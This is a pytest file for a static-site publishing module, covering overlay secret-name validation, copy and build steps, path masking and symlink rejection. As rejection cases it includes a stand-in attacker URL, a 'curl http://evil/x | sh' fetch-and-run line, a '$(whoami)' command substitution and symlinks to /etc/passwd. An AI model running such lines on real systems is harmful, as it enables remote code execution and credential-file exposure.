"""Portable tests for `ams.platform.static`.

The admin user namespace is not portable, so `run_admin` is monkeypatched with
a recording fake for the tests that exercise build steps (`files-web`'s real
`bun install` / `bun run build` form) -- bun itself is not assumed to exist on
the test host. `llm-web`'s pure-copy path (`mount["build"] == []`) needs no
`run_admin` at all: `_copy_reflink` always runs directly as the harness, on
every platform `cp -a --reflink=auto` runs (falling back to a plain copy where
the filesystem has no reflink support), so that path is exercised for real.
`tests/linux/test_platform_static_live.py` covers a real admin-ns build.
"""

from __future__ import annotations

import stat
import subprocess
from pathlib import Path

import pytest

from ams.platform import static
from ams.platform.static import (
    Overlay,
    StaticError,
    load_ams_overlay,
    overlay_secret_names,
    publish_static,
)
from ams.platform.translate import TranslateContext, translate
from ams.runtime import RuntimeStore
from ams.state import StateDir
from ams.uidmap import UidBlock
from ams.userns import AdminResult

SHA = "0123456789abcdef0123456789abcdef01234567"
SHA2 = "abcdef0123456789abcdef0123456789abcdef01"
GOLDEN_MANIFESTS = Path(__file__).parent / "golden" / "platform" / "manifests"

if (
    not subprocess.run(  # cp --reflink=auto silently degrades to a full copy
        ["cp", "--version"], capture_output=True, timeout=5
    ).returncode
    == 0
):  # pragma: no cover - every dev/CI host has coreutils cp
    pytest.skip("no cp available", allow_module_level=True)


def _mount_for(service_id: str) -> dict:
    ctx = TranslateContext(
        sha=SHA,
        services_dir=Path("/home/harness/state/services"),
        registry_url="http://127.0.0.1:19100",
        auth_url="http://127.0.0.1:19101",
    )
    text = (GOLDEN_MANIFESTS / f"{service_id}.yaml").read_text(encoding="utf-8")
    return dict(translate(text, ctx).mount)


def _make_checkout(tmp_path: Path, sha: str, apps: dict[str, dict[str, str]]) -> Path:
    """A synthetic monorepo checkout: <checkout>/apps/<id>/<files...>."""
    checkout = tmp_path / "checkout" / sha
    for app_id, files in apps.items():
        app_dir = checkout / "apps" / app_id
        app_dir.mkdir(parents=True)
        for name, content in files.items():
            (app_dir / name).write_text(content, encoding="utf-8")
    return checkout


def _state(tmp_path: Path) -> StateDir:
    return StateDir(tmp_path / "state")


def _store(tmp_path: Path) -> RuntimeStore:
    store = RuntimeStore(tmp_path / "store", bun_install=tmp_path / "bun")
    store.ensure()
    return store


def _block() -> UidBlock:
    return UidBlock(uid_start=200000, gid_start=200000)


# --------------------------------------------------------------------------- overlay


def test_overlay_missing_file_is_empty(tmp_path: Path) -> None:
    assert load_ams_overlay(tmp_path) == Overlay()
    assert overlay_secret_names(tmp_path) == []


def test_overlay_valid(tmp_path: Path) -> None:
    (tmp_path / "service.ams.toml").write_text(
        'secrets = ["DEEPSEEK_API_KEY", "DEEPSEEK_ORG_ID"]\n[env]\nFEATURE_X = "on"\n',
        encoding="utf-8",
    )
    ov = load_ams_overlay(tmp_path)
    assert ov.secrets == ("DEEPSEEK_API_KEY", "DEEPSEEK_ORG_ID")
    assert dict(ov.env) == {"FEATURE_X": "on"}
    assert overlay_secret_names(tmp_path) == ["DEEPSEEK_API_KEY", "DEEPSEEK_ORG_ID"]


def test_overlay_reserved_name_rejected(tmp_path: Path) -> None:
    (tmp_path / "service.ams.toml").write_text('secrets = ["PORT_MAIN"]\n', encoding="utf-8")
    with pytest.raises(StaticError, match="reserved"):
        load_ams_overlay(tmp_path)


@pytest.mark.parametrize(
    "name", ["REGISTRY_URL", "AUTH_URL", "GIT_COMMIT", "SVC_TOKEN", "SVC_NAME"]
)
def test_overlay_harness_injected_names_rejected(tmp_path: Path, name: str) -> None:
    # Issue #4: the overlay merges after translate with no later gate, so an
    # env entry here is an override -- REGISTRY_URL pointed off-loopback would
    # carry the injected SVC_SECRET to a third party.
    (tmp_path / "service.ams.toml").write_text(
        f'[env]\n{name} = "http://attacker.example/"\n', encoding="utf-8"
    )
    with pytest.raises(StaticError, match="injected by ams"):
        load_ams_overlay(tmp_path)


def test_overlay_harness_injected_secret_name_rejected(tmp_path: Path) -> None:
    # The same namespace rule guards `secrets`: declaring a secret named
    # SVC_* would collide with the harness's injected identity variables.
    (tmp_path / "service.ams.toml").write_text('secrets = ["SVC_SESSION"]\n', encoding="utf-8")
    with pytest.raises(StaticError, match="injected by ams"):
        load_ams_overlay(tmp_path)


def test_overlay_lowercase_name_rejected(tmp_path: Path) -> None:
    (tmp_path / "service.ams.toml").write_text('secrets = ["deepseek_api_key"]\n', encoding="utf-8")
    with pytest.raises(StaticError, match="does not match"):
        load_ams_overlay(tmp_path)


def test_overlay_value_instead_of_names_rejected(tmp_path: Path) -> None:
    # `secrets` as a table of name->value (a real credential pasted by mistake)
    # rather than a list of bare names.
    (tmp_path / "service.ams.toml").write_text(
        'secrets = { DEEPSEEK_API_KEY = "sk-not-a-name" }\n', encoding="utf-8"
    )
    with pytest.raises(StaticError, match="values belong in the SecretStore"):
        load_ams_overlay(tmp_path)


def test_overlay_duplicate_name_rejected(tmp_path: Path) -> None:
    (tmp_path / "service.ams.toml").write_text(
        'secrets = ["DEEPSEEK_API_KEY", "DEEPSEEK_API_KEY"]\n', encoding="utf-8"
    )
    with pytest.raises(StaticError, match="more than once"):
        load_ams_overlay(tmp_path)


def test_overlay_unknown_top_key_rejected(tmp_path: Path) -> None:
    (tmp_path / "service.ams.toml").write_text('typo = ["X"]\n', encoding="utf-8")
    with pytest.raises(StaticError, match="unknown key"):
        load_ams_overlay(tmp_path)


def test_overlay_env_value_must_be_string(tmp_path: Path) -> None:
    (tmp_path / "service.ams.toml").write_text("[env]\nFEATURE_X = 1\n", encoding="utf-8")
    with pytest.raises(StaticError, match="must be a string"):
        load_ams_overlay(tmp_path)


def test_overlay_invalid_toml(tmp_path: Path) -> None:
    (tmp_path / "service.ams.toml").write_text("not valid toml [[[", encoding="utf-8")
    with pytest.raises(StaticError, match="invalid TOML"):
        load_ams_overlay(tmp_path)


# -------------------------------------------------------------- publish: llm-web (no build)


def test_publish_no_build_copy(tmp_path: Path) -> None:
    mount = dict(_mount_for("llm-web"))
    mount["build"] = []  # isolate the pure-copy path from any build step
    checkout = _make_checkout(
        tmp_path, SHA, {"llm-web": {"index.html": "<h1>llm</h1>", "app.js": "console.log(1)"}}
    )
    state = _state(tmp_path)

    target = publish_static(mount, checkout, state, _store(tmp_path), None)

    assert target == state.root / "platform" / "static" / "llm-web"
    assert (target / "index.html").read_text(encoding="utf-8") == "<h1>llm</h1>"
    assert (target / ".ams-sha").read_text(encoding="utf-8").strip() == SHA
    # no scratch residue left behind after a successful publish
    assert not (target.parent / ".build" / f"llm-web-{SHA}").exists()


def test_publish_is_harness_owned_0755_0644(tmp_path: Path) -> None:
    mount = dict(_mount_for("llm-web"))
    mount["build"] = []
    checkout = _make_checkout(tmp_path, SHA, {"llm-web": {"index.html": "<h1>x</h1>"}})
    target = publish_static(mount, checkout, _state(tmp_path), _store(tmp_path), None)

    assert stat.S_IMODE(target.stat().st_mode) == 0o755
    assert stat.S_IMODE((target / "index.html").stat().st_mode) == 0o644


def test_publish_idempotent_by_sha(tmp_path: Path) -> None:
    mount = dict(_mount_for("llm-web"))
    mount["build"] = []
    checkout = _make_checkout(tmp_path, SHA, {"llm-web": {"index.html": "v1"}})
    state = _state(tmp_path)
    store = _store(tmp_path)

    first = publish_static(mount, checkout, state, store, None)
    # Mutate the source after the first publish: a no-op second call at the
    # same sha must NOT pick this up (idempotent means "skip", not "diff").
    (checkout / "apps" / "llm-web" / "index.html").write_text("v2", encoding="utf-8")
    second = publish_static(mount, checkout, state, store, None)

    assert first == second
    assert (second / "index.html").read_text(encoding="utf-8") == "v1"


def test_publish_new_sha_replaces_old_content(tmp_path: Path) -> None:
    mount = dict(_mount_for("llm-web"))
    mount["build"] = []
    state = _state(tmp_path)
    store = _store(tmp_path)

    checkout1 = _make_checkout(tmp_path, SHA, {"llm-web": {"index.html": "v1"}})
    publish_static(mount, checkout1, state, store, None)

    checkout2 = _make_checkout(tmp_path, SHA2, {"llm-web": {"index.html": "v2"}})
    target = publish_static(mount, checkout2, state, store, None)

    assert (target / "index.html").read_text(encoding="utf-8") == "v2"
    assert (target / ".ams-sha").read_text(encoding="utf-8").strip() == SHA2
    assert not (target.parent / ".llm-web.old").exists()


def test_publish_missing_app_dir_raises(tmp_path: Path) -> None:
    mount = dict(_mount_for("llm-web"))
    mount["build"] = []
    checkout = tmp_path / "checkout" / SHA
    checkout.mkdir(parents=True)  # apps/llm-web never created
    with pytest.raises(StaticError, match="no .*apps/llm-web"):
        publish_static(mount, checkout, _state(tmp_path), _store(tmp_path), None)


def test_publish_non_static_mount_raises(tmp_path: Path) -> None:
    mount = {"kind": "service", "id": "files"}
    with pytest.raises(StaticError, match="non-static"):
        publish_static(mount, tmp_path, _state(tmp_path), _store(tmp_path), None)


def test_publish_build_without_block_raises(tmp_path: Path) -> None:
    mount = dict(_mount_for("llm-web"))  # real build: one `rm -f ...` step
    checkout = _make_checkout(
        tmp_path,
        SHA,
        {"llm-web": {"index.html": "x", "service.yaml": "y", "README.md": "z"}},
    )
    with pytest.raises(StaticError, match="no UidBlock"):
        publish_static(mount, checkout, _state(tmp_path), _store(tmp_path), None)
    # failure must not leave scratch residue either
    assert not (_state(tmp_path).root / "platform" / "static" / ".build").exists() or not list(
        (_state(tmp_path).root / "platform" / "static" / ".build").iterdir()
    )


# ---------------------------------------------------------- publish: files-web (bun form)


class _RecordingAdmin:
    """Fake `run_admin`: records argv, returns success without executing anything."""

    def __init__(self) -> None:
        self.calls: list[tuple[str, ...]] = []
        self.masks: list[tuple[Path, ...]] = []

    def __call__(self, argv, block, *, timeout_s: float = 60.0, mask=()) -> AdminResult:
        self.calls.append(tuple(argv))
        self.masks.append(tuple(mask))
        # Simulate `bun run build` producing dist/ and the prune/promote steps
        # having already run by the time the *next* real fake step is asked
        # for -- this fake never touches disk, so the on-disk assertions in
        # this test only cover argv shape, not build output content (that is
        # the live test's job).
        return AdminResult(tuple(argv), 0, b"", b"")


def test_publish_files_web_runs_build_steps_via_admin_ns(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    mount = dict(_mount_for("files-web"))
    checkout = _make_checkout(tmp_path, SHA, {"files-web": {"package.json": "{}"}})
    store = _store(tmp_path)
    fake = _RecordingAdmin()
    monkeypatch.setattr(static, "run_admin", fake)

    target = publish_static(mount, checkout, _state(tmp_path), store, _block())

    assert target == _state(tmp_path).root / "platform" / "static" / "files-web"
    assert len(fake.calls) == 5  # the 5 deploy.install lines in files-web.yaml
    build_dir = _state(tmp_path).root / "platform" / "static" / ".build" / f"files-web-{SHA}"
    env_prefix = [f"{k}={v}" for k, v in sorted(static.provisioning_env(store).items())]
    expected_prefix = ["env", "-i", "-C", str(build_dir), *env_prefix]
    expected_bins = ["bun", "bun", "find", "cp", "rm"]
    for call, expected_bin in zip(fake.calls, expected_bins, strict=True):
        assert list(call[: len(expected_prefix)]) == expected_prefix
        real_argv = call[len(expected_prefix) :]
        assert real_argv[0] == expected_bin
    # exact argv for the two unambiguous, order-sensitive steps
    assert fake.calls[0][len(expected_prefix) :] == ("bun", "install")
    assert fake.calls[1][len(expected_prefix) :] == ("bun", "run", "build")
    assert fake.calls[4][len(expected_prefix) :] == ("rm", "-rf", "dist")
    # even with a real build result absent (fake never wrote files), the
    # scratch dir is always cleaned up (finally-block) once publish returns.
    assert not build_dir.exists()


def test_publish_build_step_failure_raises_and_cleans_up(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    mount = dict(_mount_for("files-web"))
    checkout = _make_checkout(tmp_path, SHA, {"files-web": {"package.json": "{}"}})

    def failing(argv, block, *, timeout_s: float = 60.0, mask=()) -> AdminResult:
        return AdminResult(tuple(argv), 1, b"", b"bun: command not found")

    monkeypatch.setattr(static, "run_admin", failing)

    with pytest.raises(StaticError, match="failed"):
        publish_static(mount, checkout, _state(tmp_path), _store(tmp_path), _block())

    build_root = _state(tmp_path).root / "platform" / "static" / ".build"
    assert not build_root.exists() or not list(build_root.iterdir())
    # nothing was ever published
    assert not (_state(tmp_path).root / "platform" / "static" / "files-web").exists()


# --------------------------------------------------------------------------- build-command parsing


def test_publish_build_steps_run_with_harness_paths_masked(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    # Issue #1: a build runs as inner root whose file identity is the harness
    # uid; every build step must carry the mask of harness-private paths, and
    # the static subtree holding the build dir must stay visible.
    fake = _RecordingAdmin()
    monkeypatch.setattr(static, "run_admin", fake)
    state = _state(tmp_path)
    checkout = _make_checkout(tmp_path, SHA, {"files-web": {"package.json": "{}"}})

    publish_static(dict(_mount_for("files-web")), checkout, state, _store(tmp_path), _block())

    expected = tuple(static._build_mask(state))
    assert expected, "the mask must not be empty"
    assert fake.masks and len(fake.masks) == len(fake.calls)
    assert all(m == expected for m in fake.masks)
    static_base = static.static_root(state)
    assert not any(m == static_base or static_base in m.parents for m in expected)
    for name in ("secrets", "services", "state", "logs", "control.sock"):
        assert (state.root / name) in expected


def test_publish_rejects_symlinks_committed_to_the_repo(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    # cp -a preserves symlinks and file_server follows them; a link committed
    # to the repo must fail the publish, not ship an escape hatch (#5).
    checkout = _make_checkout(tmp_path, SHA, {"files-web": {"index.html": "<h1>hi</h1>"}})
    link = checkout / "apps" / "files-web" / "evil"
    link.symlink_to("/etc/passwd")
    monkeypatch.setattr(static, "run_admin", _RecordingAdmin())

    with pytest.raises(StaticError, match="symlink"):
        publish_static(
            dict(_mount_for("files-web")), checkout, _state(tmp_path), _store(tmp_path), _block()
        )

    # nothing was published and the scratch dir is gone (finally block)
    assert not (_state(tmp_path).root / "platform" / "static" / "files-web").exists()


def test_reject_symlinks_names_dirs_and_files(tmp_path: Path) -> None:
    root = tmp_path / "tree"
    (root / "sub").mkdir(parents=True)
    (root / "sub" / "to-dir").symlink_to("/etc", target_is_directory=True)
    (root / "to-file").symlink_to("/etc/passwd")
    with pytest.raises(StaticError, match="to-dir -> /etc"):
        static._reject_symlinks(root)


@pytest.mark.parametrize(
    "raw",
    [
        "curl http://evil/x | sh",
        "cd apps && bun install",
        "bun install && bun run build",
        "echo $(whoami)",
        "npm install",
    ],
)
def test_publish_rejects_unsupported_build_forms(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, raw: str
) -> None:
    mount = dict(_mount_for("llm-web"))
    mount["build"] = [raw]
    checkout = _make_checkout(tmp_path, SHA, {"llm-web": {"index.html": "x"}})
    monkeypatch.setattr(static, "run_admin", _RecordingAdmin())

    with pytest.raises(StaticError):
        publish_static(mount, checkout, _state(tmp_path), _store(tmp_path), _block())
